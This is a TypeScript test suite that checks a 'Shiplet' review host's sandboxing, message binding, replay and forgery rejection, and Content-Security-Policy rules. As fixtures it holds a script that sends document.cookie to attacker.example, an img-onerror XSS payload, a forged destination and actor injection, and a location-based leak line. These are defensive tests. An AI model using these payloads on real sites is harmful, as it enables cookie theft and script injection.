      expect.arrayContaining([expect.objectContaining({ type: "cancel" })]),
    );
    expect(oldPort.closed).toBe(true);
    expect(captureButton.disabled).toBe(true);
    expect(captureButton.textContent).toBe("Select element");

    const freshOffer = harness.artifactWindow.postMessage.mock.calls.at(
      -1,
    )?.[0] as Record<string, unknown> | undefined;
    expect(freshOffer?.channelNonce).not.toBe(
      harness.artifactOffer?.channelNonce,
    );
    if (!freshOffer) return;
    await harness.window.dispatch("message", {
      source: harness.artifactWindow,
      origin: "null",
      data: {
        protocol: "shiplet.artifact.channel.v1",
        type: "ready",
        channelNonce: freshOffer.channelNonce,
        shipletId: freshOffer.shipletId,
        revisionId: freshOffer.revisionId,
      },
    });
    const freshPort = harness.channels.at(-1)?.port1;
    expect(freshPort).toBeDefined();
    expect(captureButton.disabled).toBe(false);
    await captureButton.dispatch("click", { isTrusted: true });
    expect(freshPort?.messages.at(-1)).toMatchObject({
      type: "start",
      channelNonce: freshOffer.channelNonce,
    });
  });

  it("retires a pending widget confirmation and stale port after widget reload", async () => {
    const harness = await operateTrustedHostScript();
    const oldPort = harness.channels[0]?.port1;
    expect(oldPort).toBeDefined();
    if (!oldPort || !harness.offer) return;
    await oldPort.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "widget_before_reload",
      channelNonce: harness.offer.channelNonce,
      shipletId: harness.offer.shipletId,
      revisionId: harness.offer.revisionId,
      operation: "feedback.create",
      payload: { comment: "This request must become stale." },
    });
    expect(harness.confirmation.hidden).toBe(false);
    const offerCount = harness.widgetWindow.postMessage.mock.calls.length;

    await harness.widget.dispatch("load");

    expect(harness.widgetWindow.postMessage.mock.calls.length).toBeGreaterThan(
      offerCount,
    );
    expect(oldPort.closed).toBe(true);
    expect(harness.confirmation.hidden).toBe(true);
    const freshOffer = harness.widgetWindow.postMessage.mock.calls.at(
      -1,
    )?.[0] as Record<string, unknown> | undefined;
    expect(freshOffer?.channelNonce).not.toBe(harness.offer.channelNonce);
    if (!freshOffer) return;
    await harness.window.dispatch("message", {
      source: harness.widgetWindow,
      origin: "null",
      data: {
        protocol: "shiplet.widget.channel.v1",
        type: "ready",
        channelNonce: freshOffer.channelNonce,
        shipletId: freshOffer.shipletId,
        revisionId: freshOffer.revisionId,
      },
    });
    const freshPort = harness.channels.at(-1)?.port1;
    expect(freshPort).toBeDefined();
    await freshPort?.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "widget_after_reload",
      channelNonce: freshOffer.channelNonce,
      shipletId: freshOffer.shipletId,
      revisionId: freshOffer.revisionId,
      operation: "feedback.create",
      payload: { comment: "Fresh request." },
    });
    expect(harness.confirmation.hidden).toBe(false);
    expect(harness.confirmationSummary.textContent).toBe("Fresh request.");
  });

  it("accepts only a typed source-window, opaque-origin, nonce, Shiplet, and revision-bound widget operation request", () => {
    const validate =
      futureTrustedReviewHostContracts.validateTrustedWidgetOperationRequest;
    if (typeof validate !== "function") {
      expect(typeof validate).toBe("function");
      return;
    }
    const widgetWindow = {};
    const data = {
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_a",
      channelNonce: "nonce_a",
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
      payload: { comment: "Please review the contrast." },
    };
    const result = validate(
      { source: widgetWindow, origin: "null", data },
      {
        expectedSource: widgetWindow,
        channelNonce: "nonce_a",
        shipletId: "shiplet_a",
        revisionId: "revision_a1",
      },
    );
    expect(result).toEqual({
      ok: true,
      request: {
        requestId: "request_a",
        operation: "feedback.create",
        payload: { comment: "Please review the contrast." },
      },
    });
  });

  it("accepts a bounded workflow event request but does not accept widget-supplied actor or approval fields", () => {
    const validate =
      futureTrustedReviewHostContracts.validateTrustedWidgetOperationRequest;
    const widgetWindow = {};
    const binding = {
      expectedSource: widgetWindow,
      channelNonce: "nonce_workflow",
      shipletId: "shiplet_a",
      revisionId: "revision_a2",
    };
    const base = {
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_workflow",
      channelNonce: "nonce_workflow",
      shipletId: "shiplet_a",
      revisionId: "revision_a2",
      operation: "workflow.event.create",
      payload: {
        status: "Waiting on owner",
        summary: "Legal review is required",
        fields: {
          risk: '<img src=x onerror="globalThis.compromised=true">',
          score: 5,
        },
      },
    };

    expect(
      validate({ source: widgetWindow, origin: "null", data: base }, binding),
    ).toEqual({
      ok: true,
      request: {
        requestId: "request_workflow",
        operation: "workflow.event.create",
        payload: {
          status: "Waiting on owner",
          summary: "Legal review is required",
          fields: {
            risk: '<img src=x onerror="globalThis.compromised=true">',
            score: 5,
          },
        },
      },
    });
    expect(
      validate(
        {
          source: widgetWindow,
          origin: "null",
          data: { ...base, actor: { kind: "human", id: "forged" } },
        },
        binding,
      ),
    ).toMatchObject({ ok: false });
    expect(
      validate(
        {
          source: widgetWindow,
          origin: "null",
          data: {
            ...base,
            payload: { ...base.payload, approved: true },
          },
        },
        binding,
      ),
    ).toMatchObject({ ok: false });
  });

  it.each([
    ["wrong source window", { source: {} }, {}],
    ["non-opaque origin", { origin: "https://artifact-a.shiplet.cc" }, {}],
    ["wrong channel nonce", {}, { data: { channelNonce: "nonce_other" } }],
    ["wrong Shiplet", {}, { data: { shipletId: "shiplet_other" } }],
    ["wrong revision", {}, { data: { revisionId: "revision_other" } }],
    [
      "actor forgery fields",
      {},
      { data: { actor: { kind: "human", id: "user_forged" } } },
    ],
    [
      "undeclared operation",
      {},
      { data: { operation: "kernel.revision.promote" } },
    ],
  ])(
    "rejects a custom widget request with %s before trusted confirmation",
    (_caseName, eventOverride, dataOverride) => {
      const validate =
        futureTrustedReviewHostContracts.validateTrustedWidgetOperationRequest;
      if (typeof validate !== "function") {
        expect(typeof validate).toBe("function");
        return;
      }
      const widgetWindow = {};
      const data = {
        protocol: "shiplet.widget.operation.v1",
        type: "request",
        requestId: "request_a",
        channelNonce: "nonce_a",
        shipletId: "shiplet_a",
        revisionId: "revision_a1",
        operation: "feedback.create",
        payload: { comment: "Please review the contrast." },
        ...((dataOverride as { data?: Record<string, unknown> }).data || {}),
      };
      expect(
        validate(
          {
            source: widgetWindow,
            origin: "null",
            data,
            ...eventOverride,
          },
          {
            expectedSource: widgetWindow,
            channelNonce: "nonce_a",
            shipletId: "shiplet_a",
            revisionId: "revision_a1",
          },
        ),
      ).toMatchObject({ ok: false });
    },
  );

  it("projects an accepted widget request into bounded inert text for explicit trusted confirmation", () => {
    const project =
      futureTrustedReviewHostContracts.projectTrustedWidgetConfirmation;
    if (typeof project !== "function") {
      expect(typeof project).toBe("function");
      return;
    }
    const confirmation = project({
      requestId: "request_a",
      operation: "feedback.create",
      payload: {
        comment:
          '<img src=x onerror="globalThis.compromised=true"> Please review.',
      },
    });
    expect(confirmation).toEqual({
      requestId: "request_a",
      operation: "feedback.create",
      heading: "Custom widget requests an action",
      summary:
        '<img src=x onerror="globalThis.compromised=true"> Please review.',
      confirmLabel: "Send feedback",
    });
    expect(JSON.stringify(confirmation)).not.toContain("actor");
    expect(JSON.stringify(confirmation)).not.toContain("approved");
    expect(
      new TextEncoder().encode(confirmation.summary).byteLength,
    ).toBeLessThan(6_001);
  });

  it("rejects an untrusted synthetic submission of the built-in kernel feedback form", async () => {
    const harness = await operateTrustedHostScript();
    expect.soft(harness.form).toBeDefined();
    expect.soft(harness.comment).toBeDefined();
    if (!harness.form || !harness.comment) return;
    harness.comment.value = "Synthetic feedback must not become a human action";
    await harness.form.dispatch("submit", {
      preventDefault: vi.fn(),
      isTrusted: false,
    });
    expect(harness.fetch).not.toHaveBeenCalled();
    expect(harness.submittedForms).toHaveLength(0);
    expect(harness.submit?.disabled).toBe(false);
  });

  it("submits trusted built-in feedback through a credential-free top-level POST ceremony", async () => {
    const harness = await operateTrustedHostScript();
    expect.soft(harness.form).toBeDefined();
    expect.soft(harness.comment).toBeDefined();
    if (!harness.form || !harness.comment) return;
    harness.comment.value = "Review the pricing comparison";
    await harness.form.dispatch("submit", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect.soft(harness.fetch).not.toHaveBeenCalled();
    expect.soft(harness.open).not.toHaveBeenCalled();
    expect.soft(harness.submittedForms).toHaveLength(1);
    const topLevelForm = harness.submittedForms[0];
    if (!topLevelForm) return;
    expectSecureTopLevelConfirmationForm(topLevelForm, {
      comment: "Review the pricing comparison",
      pageUrl: "https://client.example/pricing/",
    });
  });

  it("operates the generated host script and prevents a later widget message from replacing a pending confirmation", async () => {
    const harness = await operateTrustedHostScript();
    const port = harness.channels[0]?.port1;
    expect(port).toBeDefined();
    const binding = {
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
    };
    await port?.dispatch({
      ...binding,
      requestId: "request_first",
      payload: { comment: "First visible request" },
    });
    expect(harness.confirmation.hidden).toBe(false);
    expect(harness.confirmationSummary.textContent).toBe(
      "First visible request",
    );
    await port?.dispatch({
      ...binding,
      requestId: "request_second",
      payload: { comment: "Swapped request" },
    });
    expect(harness.confirmationSummary.textContent).toBe(
      "First visible request",
    );
    expect(harness.fetch).not.toHaveBeenCalled();
  });

  it("rejects replay of a widget request after the trusted host has denied it", async () => {
    const harness = await operateTrustedHostScript();
    const port = harness.channels[0]?.port1;
    const request = {
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_replay",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
      payload: { comment: "Do not replay this request" },
    };
    await port?.dispatch(request);
    await harness.cancel.dispatch("click", { isTrusted: true });
    expect.soft(harness.confirmation.hidden).toBe(true);
    expect.soft(port?.messages).toContainEqual({
      protocol: "shiplet.widget.operation.result.v1",
      requestId: "request_replay",
      status: "denied",
    });

    await port?.dispatch(request);
    expect.soft(harness.confirmation.hidden).toBe(true);
    expect.soft(harness.confirmationSummary.textContent).toBe("");
  });

  it("submits a widget request through the same credential-free top-level POST ceremony", async () => {
    const harness = await operateTrustedHostScript();
    const port = harness.channels[0]?.port1;
    await port?.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_confirm",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
      payload: { comment: "Confirm only in trusted top-level UI" },
    });
    await harness.confirm.dispatch("click", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect.soft(harness.fetch).not.toHaveBeenCalled();
    expect.soft(harness.open).not.toHaveBeenCalled();
    expect.soft(harness.submittedForms).toHaveLength(1);
    const topLevelForm = harness.submittedForms[0];
    if (!topLevelForm) return;
    expectSecureTopLevelConfirmationForm(topLevelForm, {
      requestId: "request_confirm",
      comment: "Confirm only in trusted top-level UI",
      pageUrl: "https://client.example/pricing/",
    });
  });

  it("submits a package workflow request through the trusted top-level confirmation ceremony", async () => {
    const harness = await operateTrustedHostScript();
    const port = harness.channels[0]?.port1;
    await port?.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_workflow_confirm",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "workflow.event.create",
      payload: {
        status: "Waiting on owner",
        summary: "Legal review is required",
        fields: {
          risk: '<img src=x onerror="globalThis.compromised=true">',
          score: 5,
        },
      },
    });
    expect(harness.confirmationSummary.textContent).toBe(
      "Waiting on owner: Legal review is required",
    );
    expect(harness.confirmationFields.hidden).toBe(false);
    expect(harness.confirmationFields.textContent).toBe(
      'risk: "<img src=x onerror=\\"globalThis.compromised=true\\">"\nscore: 5',
    );
    expect(harness.confirmationFields.children).toHaveLength(0);
    await harness.confirm.dispatch("click", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect(harness.submittedForms).toHaveLength(1);
    const form = harness.submittedForms[0];
    if (!form) return;
    const fields = operatedFormFields(form);
    expect(fields).toMatchObject({
      operation: "workflow.event.create",
      workflow_status: "Waiting on owner",
      workflow_summary: "Legal review is required",
      shiplet_id: "shiplet_a",
      revision_id: "revision_a1",
    });
    expect(JSON.parse(fields.workflow_fields_json)).toEqual({
      risk: '<img src=x onerror="globalThis.compromised=true">',
      score: 5,
    });
    expect(fields).not.toHaveProperty("comment");
    expect(fields).not.toHaveProperty("client_feedback_id");
  });

  it("keeps a blocked top-level confirmation accessible and retryable without performing a side effect", async () => {
    const harness = await operateTrustedHostScript({
      failTopLevelSubmission: true,
    });
    const port = harness.channels[0]?.port1;
    await port?.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_retry",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
      payload: { comment: "Retry this confirmation" },
    });
    await harness.confirm.dispatch("click", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect.soft(harness.submittedForms).toHaveLength(0);
    expect.soft(harness.fetch).not.toHaveBeenCalled();
    expect.soft(harness.open).not.toHaveBeenCalled();
    expect.soft(harness.confirm.disabled).toBe(false);
    expect.soft(harness.confirmation.hidden).toBe(false);
    expect.soft(harness.status?.getAttribute("role")).toBe("alert");
    expect
      .soft(String(harness.status?.textContent || "").toLowerCase())
      .toMatch(/blocked|could not|unable/);

    harness.setTopLevelSubmissionFailure(false);
    await harness.confirm.dispatch("click", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect.soft(harness.submittedForms).toHaveLength(1);
    expect.soft(harness.fetch).not.toHaveBeenCalled();
  });

  it("does not let widget messages choose the confirmation destination or alter its actor, revision, or pending payload", async () => {
    const harness = await operateTrustedHostScript();
    const port = harness.channels[0]?.port1;
    const binding = {
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
    };
    await port?.dispatch({
      ...binding,
      requestId: "request_bound",
      payload: { comment: "Bound request" },
    });
    await port?.dispatch({
      ...binding,
      requestId: "request_destination",
      payload: { comment: "Destination injection" },
      destination: "https://attacker.example/confirm",
      actor: { kind: "human", id: "user_forged" },
    });
    await port?.dispatch({
      ...binding,
      requestId: "request_revision",
      revisionId: "revision_attacker",
      payload: { comment: "Revision injection" },
    });
    await port?.dispatch({
      ...binding,
      requestId: "request_swap",
      payload: { comment: "Valid but later payload" },
    });
    expect(harness.confirmationSummary.textContent).toBe("Bound request");
    await harness.confirm.dispatch("click", {
      preventDefault: vi.fn(),
      isTrusted: true,
    });
    expect.soft(harness.fetch).not.toHaveBeenCalled();
    expect.soft(harness.open).not.toHaveBeenCalled();
    expect.soft(harness.submittedForms).toHaveLength(1);
    const topLevelForm = harness.submittedForms[0];
    if (!topLevelForm) return;
    expectSecureTopLevelConfirmationForm(topLevelForm, {
      requestId: "request_bound",
      comment: "Bound request",
      pageUrl: "https://client.example/pricing/",
    });
    const serialized = JSON.stringify(operatedFormFields(topLevelForm));
    expect(serialized).not.toContain("attacker.example");
    expect(serialized).not.toContain("user_forged");
    expect(serialized).not.toContain("revision_attacker");
  });

  it("operates the generated parser and ignores hostile parent or actor-forging messages", async () => {
    const harness = await operateTrustedHostScript();
    await harness.window.dispatch("message", {
      source: {},
      origin: "https://client.example",
      data: {
        protocol: "shiplet.widget.channel.v1",
        type: "ready",
        channelNonce: harness.offer?.channelNonce,
        shipletId: "shiplet_a",
        revisionId: "revision_a1",
      },
    });
    const port = harness.channels[0]?.port1;
    await port?.dispatch({
      protocol: "shiplet.widget.operation.v1",
      type: "request",
      requestId: "request_forged",
      channelNonce: harness.offer?.channelNonce,
      shipletId: "shiplet_a",
      revisionId: "revision_a1",
      operation: "feedback.create",
      payload: { comment: "Forged" },
      actor: { kind: "human", id: "user_forged" },
    });
    expect(harness.confirmation.hidden).toBe(true);
    expect(harness.fetch).not.toHaveBeenCalled();
    expect(harness.open).not.toHaveBeenCalled();
  });

  it.each([
    ["expired", 401, "expired"],
    ["revoked", 410, "revoked"],
    ["permission_denied", 403, "permission"],
    ["offline", 503, "offline"],
  ] as const)(
    "renders a distinct accessible %s trusted-host state without arbitrary frames",
    async (reviewState, expectedStatus, expectedCopy) => {
      const createWithState = createTrustedReviewHostResponse as (
        input: typeof baseInput & {
          reviewState: typeof reviewState;
        },
      ) => Response;
      const response = createWithState({ ...baseInput, reviewState });
      const html = await response.text();
      expect(response.status).toBe(expectedStatus);
      expect(html).toContain(`data-review-state="${reviewState}"`);
      expect(html.toLowerCase()).toContain(expectedCopy);
      expect(html).toContain('role="alert"');
      expect(html).toContain('id="shiplet-kernel-review-panel"');
      expect(html).not.toContain("data-shiplet-artifact-frame");
      expect(html).not.toContain("data-shiplet-widget-frame");
      expect(
        (response.headers.get("content-security-policy") || "")
          .split("; ")
          .find((directive) => directive.startsWith("form-action ")),
      ).toBe("form-action 'none'");
    },
  );

  it("serves bounded accessible trusted-host styles", () => {
    const styles = trustedReviewHostStyles();
    expect(styles).toContain(":focus-visible");
    expect(styles).toContain("@media (max-width:480px)");
    expect(styles).not.toContain("@media (max-width:640px)");
    expect(styles).toContain("width:min(312px,calc(100vw - 24px))");
    expect(styles).toContain("max-height:min(520px,calc(100dvh - 24px))");
    expect(styles).toContain('data-panel-open="true"');
    expect(styles).toContain("visibility:hidden");
    expect(styles).toContain("overflow-x:hidden");
    expect(styles).toContain("grid-template-columns:auto minmax(0,1fr) auto");
    expect(styles).toContain(
      "[data-shiplet-kernel-review-controls]{display:grid;min-width:0;grid-template-columns:minmax(0,1fr)}",
    );
    expect(styles).toContain(".shiplet-review-thread-author{grid-column:1/3");
    expect(styles).toContain(
      ".shiplet-review-thread-summary-comment{grid-column:2/4",
    );
    expect(styles).toContain(".shiplet-review-head{flex-wrap:wrap}");
    expect(styles).toContain(".shiplet-review-heading{flex-basis:100%}");
    expect(styles).toContain(
      ".shiplet-review-compose{width:44px;padding:0;font-size:18px}",
    );
    expect(styles).toContain(
      ".shiplet-review-context-disclosure summary{display:flex;align-items:center;min-height:44px}",
    );
    expect(styles).toContain(
      ".shiplet-review-reply-form input{min-height:44px}",
    );
    expect(styles).toContain('.shiplet-review-list>li[data-active="true"]');
    expect(styles).toContain(
      '.shiplet-review-list>li[data-active="true"]{border-color:#a7b9c3;box-shadow:inset 2px 0 0 var(--shiplet-accent);background:#f8fbfc}',
    );
    expect(styles).not.toContain(
      "border-color:var(--shiplet-action);box-shadow:inset 3px 0 0 var(--shiplet-action)",
    );
    expect(styles).toContain('.shiplet-review-pin[data-active="true"]');
    expect(styles).toContain(
      ".shiplet-review-reply-form{display:grid;grid-template-columns:minmax(0,1fr) auto",
    );
    expect(styles).toContain(".shiplet-review-launcher-dock{");
    expect(styles).toContain(
      'iframe[data-shiplet-artifact-frame][data-shiplet-selecting="true"]{outline:3px solid #1677ff',
    );
    expect(styles).toContain(
      '.shiplet-review-form[data-annotation-state="compact"]{grid-template-columns:minmax(0,1fr) auto',
    );
    expect(styles).toContain(
      '.shiplet-review-form[data-annotation-state="expanded"]{gap:10px;max-height:min(520px,calc(100dvh - 16px))',
    );
    expect(styles).toContain(".shiplet-annotation-target-pin{");
    expect(styles).toContain(".shiplet-annotation-target-focus{");
    expect(styles).toContain(".shiplet-annotation-drag-handle{");
    expect(styles).toContain(".shiplet-annotation-property-rows{");
    expect(styles).toContain(
      '.shiplet-review-form[data-annotation-state="expanded"] .shiplet-annotation-settings{display:none}',
    );
    expect(styles).toContain("touch-action:none");
    expect(styles).toContain(
      ".shiplet-annotation-modebar button{min-width:44px;min-height:44px}",
    );
    expect(styles).toContain(
      '.shiplet-review-form[data-annotation-state="expanded"]{max-height:calc(100dvh - 16px)}',
    );
    expect(styles).toContain("@media (prefers-reduced-motion:reduce)");
    expect(new TextEncoder().encode(styles).byteLength).toBeLessThan(32_768);
  });

  it("lets artifact frames follow the viewer color scheme while the trusted review controls stay light", () => {
    const styles = trustedReviewHostStyles();
    expect(styles).toContain(":root{color-scheme:light;");
    expect(styles).toMatch(
      /iframe\[data-shiplet-artifact-frame\]\{[^}]*color-scheme:light dark/,
    );
  });

  it("serves artifact bytes unchanged behind a deny-by-default browser egress policy", async () => {
    const hostile = `<!doctype html><script>
			fetch("https://attacker.example/collect?cookie=" + document.cookie);
			parent.postMessage({ type: "forge-human", token: localStorage.token }, "*");
		</script>`;
    const response = createSandboxedArtifactResponse({
      body: hostile,
      contentType: "text/html; charset=utf-8",
      role: "artifact",
      trustedHostOrigin: "https://app.shiplet.cc",
    });

    expect(await response.text()).toBe(hostile);
    const csp = response.headers.get("content-security-policy") || "";
    expect(csp).toContain("sandbox allow-scripts");
    expect(csp).not.toContain("allow-modals");
    expect(csp).not.toContain("allow-downloads");
    const connectDirective = csp
      .split(";")
      .map((directive) => directive.trim())
      .find((directive) => directive.startsWith("connect-src "));
    expect(connectDirective).toBe("connect-src https://app.shiplet.cc");
    expect(connectDirective).not.toContain("attacker.example");
    expect(csp).not.toContain("allow-same-origin");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors https://app.shiplet.cc");
    expect(response.headers.get("access-control-allow-origin")).toBeNull();
    expect(response.headers.get("cache-control")).toBe(
      "private, no-store, no-transform",
    );
  });

  it("limits framework runtime and data connections to the trusted Shiplet origin", () => {
    const artifact = createSandboxedArtifactResponse({
      body: `<!doctype html><script type="module" src="/_next/static/chunks/app.js"></script>`,
      contentType: "text/html; charset=utf-8",
      role: "artifact",
      trustedHostOrigin: "https://review.example.com",
    });
    const widget = createSandboxedArtifactResponse({
      body: "<!doctype html><p>Widget</p>",
      contentType: "text/html; charset=utf-8",
      role: "widget",
      trustedHostOrigin: "https://review.example.com",
    });
    const reviewContext = createSandboxedArtifactResponse({
      body: "<!doctype html><p>Context</p>",
      contentType: "text/html; charset=utf-8",
      role: "review_context",
      trustedHostOrigin: "https://review.example.com",
    });
    const connectDirective = (response: Response) =>
      (response.headers.get("content-security-policy") || "")
        .split(";")
        .map((directive) => directive.trim())
        .find((directive) => directive.startsWith("connect-src "));
    const baseDirective = (response: Response) =>
      (response.headers.get("content-security-policy") || "")
        .split(";")
        .map((directive) => directive.trim())
        .find((directive) => directive.startsWith("base-uri "));

    expect(connectDirective(artifact)).toBe(
      "connect-src https://review.example.com",
    );
    expect(connectDirective(widget)).toBe("connect-src 'none'");
    expect(connectDirective(reviewContext)).toBe("connect-src 'none'");
    expect(baseDirective(artifact)).toBe("base-uri https://review.example.com");
    expect(baseDirective(widget)).toBe("base-uri 'none'");
    expect(baseDirective(reviewContext)).toBe("base-uri 'none'");
    expect(() =>
      createSandboxedArtifactResponse({
        body: "",
        contentType: "application/json",
        role: "artifact",
        trustedHostOrigin: "https://review.example.com",
        allowedEgressOrigins: ["https://api.example.test"],
      }),
    ).toThrowError(/limited to the trusted host origin/i);
  });

  it("allows downloads only for an explicitly trusted artifact response", () => {
    const response = createSandboxedArtifactResponse({
      body: '<!doctype html><a download href="data:text/plain,review">Download</a>',
      contentType: "text/html; charset=utf-8",
      role: "artifact",
      trustedHostOrigin: "https://app.shiplet.cc",
      allowDownloads: true,
    });
    const csp = response.headers.get("content-security-policy") || "";

    expect(csp).toContain("sandbox allow-scripts allow-forms allow-downloads");
    expect(csp).toContain("connect-src https://app.shiplet.cc");
    expect(() =>
      createSandboxedArtifactResponse({
        body: "widget",
        contentType: "text/html",
        role: "widget",
        trustedHostOrigin: "https://app.shiplet.cc",
        allowDownloads: true,
      }),
    ).toThrowError(/downloads/i);
  });

  it("refuses declared ambient egress even for artifact responses", () => {
    expect(() =>
      createSandboxedArtifactResponse({
        body: "body{}",
        contentType: "text/css",
        role: "artifact",
        trustedHostOrigin: "https://app.shiplet.cc",
        allowedEgressOrigins: [
          "https://api.example.test",
          "https://api.example.test/",
        ],
      }),
    ).toThrowError(/limited to the trusted host origin/i);
    expect(() =>
      createSandboxedArtifactResponse({
        body: "",
        contentType: "text/html",
        role: "artifact",
        trustedHostOrigin: "https://app.shiplet.cc",
        allowedEgressOrigins: ["https://api.example.test/path"],
      }),
    ).toThrowError(/egress origin/i);
  });

  it("preserves only safe artifact delivery metadata", () => {
    const response = createSandboxedArtifactResponse({
      body: "bytes",
      contentType: "image/png",
      role: "artifact",
      trustedHostOrigin: "https://app.shiplet.cc",
      status: 206,
      sourceHeaders: new Headers({
        allow: "GET, HEAD",
        "content-length": "5",
        "content-range": "bytes 0-4/10",
        etag: '"asset-v1"',
        "x-shiplet-runtime-status": "managed_dynamic_unavailable",
        "x-shiplet-static-fallback": "r2",
        "set-cookie": "must-not-cross=1",
        authorization: "must-not-cross",
      }),
    });
    expect(response.status).toBe(206);
    expect(response.headers.get("allow")).toBe("GET, HEAD");
    expect(response.headers.get("content-length")).toBe("5");
    expect(response.headers.get("content-range")).toBe("bytes 0-4/10");
    expect(response.headers.get("etag")).toBe('"asset-v1"');
    expect(response.headers.get("x-shiplet-runtime-status")).toBe(
      "managed_dynamic_unavailable",
    );
    expect(response.headers.get("x-shiplet-static-fallback")).toBe("r2");
    expect(response.headers.get("set-cookie")).toBeNull();
    expect(response.headers.get("authorization")).toBeNull();
  });

  it("assigns least-privilege CSP by sandbox document role", () => {
    const create = (role: "artifact" | "widget" | "review_context") =>
      createSandboxedArtifactResponse({
        body: "<!doctype html><p>Sandbox document</p>",
        contentType: "text/html; charset=utf-8",
        role,
        trustedHostOrigin: "https://app.shiplet.cc",
      }).headers.get("content-security-policy") || "";
    const artifact = create("artifact");
    const widget = create("widget");
    const reviewContext = create("review_context");
    const widgetScriptPolicy =
      widget
        .split(";")
        .map((directive) => directive.trim())
        .find((directive) => directive.startsWith("script-src ")) || "";

    expect(artifact).toContain("script-src https://app.shiplet.cc");
    expect(artifact).toContain("'unsafe-inline'");
    expect(artifact).toContain("'unsafe-eval'");
    expect(artifact).toContain("sandbox allow-scripts allow-forms");
    expect(widgetScriptPolicy).toMatch(
      /^script-src 'nonce-[A-Za-z0-9+/_=-]{20,}'$/,
    );
    expect(widgetScriptPolicy).not.toContain("'unsafe-inline'");
    expect(widgetScriptPolicy).not.toContain("'unsafe-eval'");
    expect(widget).toContain("script-src-attr 'none'");
    expect(widget).toContain("worker-src blob:");
    expect(widget).toContain("frame-src 'none'");
    expect(widget).not.toContain("sandbox allow-scripts allow-forms");
    expect(widget).not.toContain("allow-popups");
    expect(widget).not.toContain("script-src https://app.shiplet.cc");
    expect(reviewContext).toContain("sandbox");
    expect(reviewContext).not.toContain("sandbox allow-scripts");
    expect(reviewContext).toContain("script-src 'none'");
    expect(reviewContext).toContain("script-src-attr 'none'");
    expect(reviewContext).not.toContain("'unsafe-inline'");
    expect(new Set([artifact, widget, reviewContext])).toHaveLength(3);
    expect(() =>
      createSandboxedArtifactResponse({
        body: "",
        contentType: "text/html",
        role: "review_context",
        trustedHostOrigin: "https://app.shiplet.cc",
        allowedEgressOrigins: ["https://api.example.test"],
      }),
    ).toThrowError(/limited to the trusted host origin/i);
  });

  it("places package widget source only inside the bounded non-navigable Worker bootstrap", async () => {
    const packageSource =
      'shipletWidget.text("#status", "ready"); location.href = "https://example.invalid/leak";';
    const response = createSandboxedArtifactResponse({
      body: '<!doctype html><p id="status">waiting</p><script>must not execute</script>',
      contentType: "text/html; charset=utf-8",
      role: "widget",
      trustedHostOrigin: "https://app.shiplet.cc",
      widgetRuntime: {
        scriptSource: packageSource,
        shipletId: "shiplet_a",
        revisionId: "revision_a",
      },
    });
    const html = await response.text();
    const workerSourceBase64 = html.match(
      /const sourceBase64 = ("[A-Za-z0-9+/=]+")/,
    )?.[1];

    expect(html).toContain('data-shiplet-widget-compartment="worker-v1"');
    expect(html).not.toContain(packageSource);
    expect(workerSourceBase64).toBeTruthy();
    const workerSource = Buffer.from(
      JSON.parse(workerSourceBase64 || '""'),
      "base64",
    ).toString("utf8");
    expect(workerSource).toContain(packageSource);
    expect(workerSource).toContain('"BroadcastChannel"');
    expect(workerSource).toContain('"WebSocketStream"');
    expect(workerSource).toContain('"fetch"');
    expect(workerSource).toContain('type: "pong"');
    expect(html).toContain(
      'failWidget("Custom widget exceeded its execution limit.")',
    );
    expect(html).toContain("data-shiplet-widget-restart");
    expect(html).toContain("restart.hidden = false");
    expect(html).toContain("event.isTrusted !== true");
    expect(html).toContain('protocol: "shiplet.widget.restart.v1"');
    expect(html).toContain("channelNonce, shipletId, revisionId");
    expect(html).not.toContain("window.location.reload()");
    expect(html).toContain("messageCount > 512");
    expect(html).not.toContain("sandbox allow-scripts allow-forms");
  });

  it("compiles package scripts out of the trusted renderer template", () => {
    const encoder = new TextEncoder();
    const compiled = compileRuntimeV1Widget({
      entryPath: "widget/index.html",
      files: [
        {
          path: "widget/index.html",
          mediaType: "text/html; charset=utf-8",
          bytes: encoder.encode(
            '<!doctype html><p id="status">waiting</p><script src="./widget.js"></script>',
          ),
        },
        {
          path: "widget/widget.js",
          mediaType: "text/javascript; charset=utf-8",
          bytes: encoder.encode('shipletWidget.text("#status", "ready");'),
        },
      ],
      dataUrls: new Map(),
    });

    expect(compiled.templateHtml).toContain('<p id="status">waiting</p>');
    expect(compiled.templateHtml).not.toContain("<script");
    expect(compiled.templateHtml).not.toContain("shipletWidget.text");
    expect(compiled.scriptSource).toBe(
      'shipletWidget.text("#status", "ready");',
    );
  });
});
